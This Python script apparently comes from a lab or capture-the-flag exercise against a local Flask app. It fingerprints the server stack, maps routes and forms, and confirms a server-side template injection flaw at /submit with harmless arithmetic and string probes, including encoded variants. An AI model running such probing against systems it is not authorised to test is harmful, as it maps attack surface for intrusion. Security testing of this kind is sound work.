import requests
import re
import json
from urllib.parse import urljoin

base_url = "http://localhost"

# Store architecture information
architecture = {
    "server_stack": {},
    "routes": {},
    "vulnerabilities": []
}

print("=" * 80)
print("FLASK ARCHITECTURE MAPPING - COMPREHENSIVE RECONNAISSANCE")
print("=" * 80)

# First, check server headers to confirm stack
print("\n[1] SERVER STACK IDENTIFICATION")
print("-" * 80)
try:
    resp = requests.get(base_url, timeout=10)
    server_header = resp.headers.get('Server', 'Not found')
    print(f"Server Header: {server_header}")
    
    # Extract stack information
    if 'Werkzeug' in server_header:
        werkzeug_match = re.search(r'Werkzeug/(\d+\.\d+\.\d+)', server_header)
        if werkzeug_match:
            architecture["server_stack"]["werkzeug_version"] = werkzeug_match.group(1)
            print(f"✓ Werkzeug Version: {werkzeug_match.group(1)}")
    
    if 'Python' in server_header:
        python_match = re.search(r'Python/(\d+\.\d+\.\d+)', server_header)
        if python_match:
            architecture["server_stack"]["python_version"] = python_match.group(1)
            print(f"✓ Python Version: {python_match.group(1)}")
    
    architecture["server_stack"]["full_header"] = server_header
    
except Exception as e:
    print(f"[!] Error checking server stack: {e}")

# Test all discovered routes
routes_to_test = ["/", "/about", "/application", "/submit"]

print("\n[2] ROUTE DISCOVERY & ANALYSIS")
print("-" * 80)

for route in routes_to_test:
    url = urljoin(base_url, route)
    print(f"\n[*] Testing route: {route}")
    
    try:
        resp = requests.get(url, timeout=10)
        
        route_info = {
            "url": url,
            "status_code": resp.status_code,
            "method": "GET",
            "content_length": len(resp.content),
            "content_type": resp.headers.get('Content-Type', 'unknown'),
            "forms": [],
            "vulnerable": False,
            "notes": []
        }
        
        print(f"  Status: {resp.status_code}")
        print(f"  Content-Type: {route_info['content_type']}")
        print(f"  Content-Length: {len(resp.content)} bytes")
        
        # Check for forms in the response
        form_matches = re.findall(r'<form[^>]*>(.*?)</form>', resp.text, re.DOTALL | re.IGNORECASE)
        
        if form_matches:
            print(f"  [+] Found {len(form_matches)} form(s)")
            
            for i, form_html in enumerate(form_matches, 1):
                form_info = {
                    "form_id": i,
                    "fields": []
                }
                
                # Extract form action and method
                action_match = re.search(r'action=["\']([^"\']+)["\']', form_html, re.IGNORECASE)
                method_match = re.search(r'method=["\']([^"\']+)["\']', form_html, re.IGNORECASE)
                
                form_action = action_match.group(1) if action_match else route
                form_method = method_match.group(1).upper() if method_match else "POST"
                
                form_info["action"] = form_action
                form_info["method"] = form_method
                
                print(f"\n    Form {i}:")
                print(f"      Action: {form_action}")
                print(f"      Method: {form_method}")
                
                # Extract input fields
                input_matches = re.findall(r'<input[^>]*>', form_html, re.IGNORECASE)
                textarea_matches = re.findall(r'<textarea[^>]*>', form_html, re.IGNORECASE)
                select_matches = re.findall(r'<select[^>]*>', form_html, re.IGNORECASE)
                
                all_inputs = input_matches + textarea_matches + select_matches
                
                if all_inputs:
                    print(f"      Fields:")
                    for field_html in all_inputs:
                        field_info = {}
                        
                        # Extract field attributes
                        name_match = re.search(r'name=["\']([^"\']+)["\']', field_html, re.IGNORECASE)
                        type_match = re.search(r'type=["\']([^"\']+)["\']', field_html, re.IGNORECASE)
                        value_match = re.search(r'value=["\']([^"\']*)["\']', field_html, re.IGNORECASE)
                        placeholder_match = re.search(r'placeholder=["\']([^"\']*)["\']', field_html, re.IGNORECASE)
                        
                        field_name = name_match.group(1) if name_match else "unknown"
                        field_type = type_match.group(1) if type_match else "text"
                        field_value = value_match.group(1) if value_match else ""
                        field_placeholder = placeholder_match.group(1) if placeholder_match else ""
                        
                        field_info = {
                            "name": field_name,
                            "type": field_type,
                            "value": field_value,
                            "placeholder": field_placeholder
                        }
                        
                        print(f"        - {field_name} (type: {field_type})")
                        if field_placeholder:
                            print(f"          Placeholder: '{field_placeholder}'")
                        
                        form_info["fields"].append(field_info)
                
                route_info["forms"].append(form_info)
        
        # Check for Jinja2 template indicators
        if "{%" in resp.text or "{{" in resp.text:
            route_info["notes"].append("Contains Jinja2 template syntax (possible unrendered templates)")
            print(f"  [!] Warning: Contains Jinja2 template syntax")
        
        # Check for debugging information
        debug_indicators = ["Traceback", "Debug", "Error", "Exception", "jinja2"]
        for indicator in debug_indicators:
            if indicator.lower() in resp.text.lower():
                route_info["notes"].append(f"Contains debugging info: {indicator}")
                print(f"  [!] Warning: Contains debugging information ({indicator})")
        
        architecture["routes"][route] = route_info
        
    except Exception as e:
        print(f"  [!] Error accessing {route}: {e}")
        architecture["routes"][route] = {"error": str(e), "url": url}

# Now test the confirmed SSTI vulnerability on /submit
print("\n[3] SSTI VULNERABILITY CONFIRMATION & ANALYSIS")
print("-" * 80)

submit_url = urljoin(base_url, "/submit")

# Test basic SSTI detection (already confirmed via {{7*7}})
test_payloads = [
    ("Basic Math", "{{7*7}}", r"49"),
    ("String Concat", "{{'a'+'b'}}", r"ab"),
    ("List Access", "{{[1,2,3][1]}}", r"2"),
    ("Dict Access", "{{{'a':'x','b':'y'}['a']}}", r"x")
]

for test_name, payload, expected_pattern in test_payloads:
    print(f"\n[*] Testing: {test_name}")
    print(f"  Payload: {payload}")
    
    try:
        # Check if /submit route has form data from previous analysis
        if "/submit" in architecture["routes"] and architecture["routes"]["/submit"]["forms"]:
            form = architecture["routes"]["/submit"]["forms"][0]
            form_fields = {field["name"]: payload for field in form["fields"]}
            
            resp = requests.post(submit_url, data=form_fields, timeout=10)
            
            print(f"  Status: {resp.status_code}")
            print(f"  Response snippet: {resp.text[:200]}...")
            
            if re.search(expected_pattern, resp.text):
                print(f"  ✓ VULNERABILITY CONFIRMED: {test_name} executed successfully")
                vuln_info = {
                    "type": "SSTI",
                    "route": "/submit",
                    "method": "POST",
                    "payload": payload,
                    "evidence": f"Expected pattern '{expected_pattern}' found in response",
                    "severity": "CRITICAL"
                }
                architecture["vulnerabilities"].append(vuln_info)
                architecture["routes"]["/submit"]["vulnerable"] = True
            else:
                print(f"  ✗ No expected output found")
        else:
            # Try with a generic field name if form analysis failed
            resp = requests.post(submit_url, data={"input": payload, "content": payload}, timeout=10)
            print(f"  Status: {resp.status_code}")
            print(f"  Response snippet: {resp.text[:200]}...")
            
            if re.search(expected_pattern, resp.text):
                print(f"  ✓ VULNERABILITY CONFIRMED: {test_name}")
                vuln_info = {
                    "type": "SSTI",
                    "route": "/submit",
                    "method": "POST",
                    "payload": payload,
                    "evidence": f"Expected pattern '{expected_pattern}' found in response",
                    "severity": "CRITICAL"
                }
                architecture["vulnerabilities"].append(vuln_info)
                if "/submit" in architecture["routes"]:
                    architecture["routes"]["/submit"]["vulnerable"] = True
    
    except Exception as e:
        print(f"  [!] Error: {e}")

# Template rendering behavior analysis
print("\n[4] TEMPLATE RENDERING BEHAVIOR ANALYSIS")
print("-" * 80)

# Test different payload encodings to understand filters
encoding_tests = [
    ("Plain", "{{7*7}}"),
    ("URL Encoded", "%7B%7B7*7%7D%7D"),
    ("HTML Entity", "&#123;&#123;7*7&#125;&#125;"),
]

for encoding_name, encoded_payload in encoding_tests:
    print(f"\n[*] Testing encoding: {encoding_name}")
    try:
        resp = requests.post(submit_url, data={"input": encoded_payload}, timeout=10)
        
        if "49" in resp.text:
            print(f"  ✓ Rendered with {encoding_name}")
        else:
            print(f"  ✗ Not rendered with {encoding_name}")
    except Exception as e:
        print(f"  [!] Error: {e}")

# Request handler mapping
print("\n[5] REQUEST HANDLER MAPPING")
print("-" * 80)

# Analyze the routes and map to likely Flask handlers
route_mappings = {
    "/": {
        "handler_type": "Main/Index page",
        "template": "likely index.html",
        "methods": ["GET"]
    },
    "/about": {
        "handler_type": "Static content page",
        "template": "likely about.html",
        "methods": ["GET"]
    },
    "/application": {
        "handler_type": "Application main page",
        "template": "likely application.html",
        "methods": ["GET"]
    },
    "/submit": {
        "handler_type": "Form submission handler with SSTI vulnerability",
        "template": "likely render_template with user input",
        "methods": ["GET", "POST"],
        "vulnerability": "Direct user input passed to template without sanitization"
    }
}

for route, mapping in route_mappings.items():
    print(f"\nRoute: {route}")
    for key, value in mapping.items():
        print(f"  {key}: {value}")

# Save complete architecture
print("\n[6] COMPLETE ARCHITECTURE SUMMARY")
print("=" * 80)

print(f"\nServer Stack:")
for key, value in architecture.get("server_stack", {}).items():
    print(f"  {key}: {value}")

print(f"\nRoutes Discovered: {len(architecture.get('routes', {}))}")
for route, info in architecture.get("routes", {}).items():
    print(f"\n  Route: {route}")
    if "error" in info:
        print(f"    Error: {info['error']}")
    else:
        print(f"    Status: {info.get('status_code', 'unknown')}")
        print(f"    Content-Type: {info.get('content_type', 'unknown')}")
        print(f"    Forms: {len(info.get('forms', []))}")
        print(f"    Vulnerable: {info.get('vulnerable', False)}")
        if info.get('notes'):
            for note in info['notes']:
                print(f"    Note: {note}")

print(f"\nVulnerabilities Found: {len(architecture.get('vulnerabilities', []))}")
for i, vuln in enumerate(architecture.get("vulnerabilities", []), 1):
    print(f"\n  Vulnerability #{i}:")
    for key, value in vuln.items():
        print(f"    {key}: {value}")

# Output the complete architecture as JSON for documentation
print("\n" + "=" * 80)
print("RAW ARCHITECTURE DATA (JSON)")
print("=" * 80)
print(json.dumps(architecture, indent=2))
